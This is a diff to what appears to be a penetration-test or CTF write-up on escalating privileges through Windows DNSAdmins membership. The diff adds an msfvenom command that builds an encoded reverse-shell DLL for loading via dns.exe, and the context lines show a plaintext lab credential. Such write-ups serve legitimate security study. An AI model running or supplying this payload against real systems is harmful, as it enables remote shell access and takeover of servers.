@@ -66,5 +66,12 @@ _Creds:_ `ryan:Serv3r4Admin4cc123!`
 
 - Ryan is member of `Contractors` and `Contractors` is member of `DNSAdmins`
 
+#### DLL Injection via dns.exe
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=9212 -f dll -o lol.dll -e x64/xor context=thread
+```
+
+
+
 [DNS exe Persistence](https://github.com/dim0x69/dns-exe-persistance)
 [Nikhil Mittal Blog](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
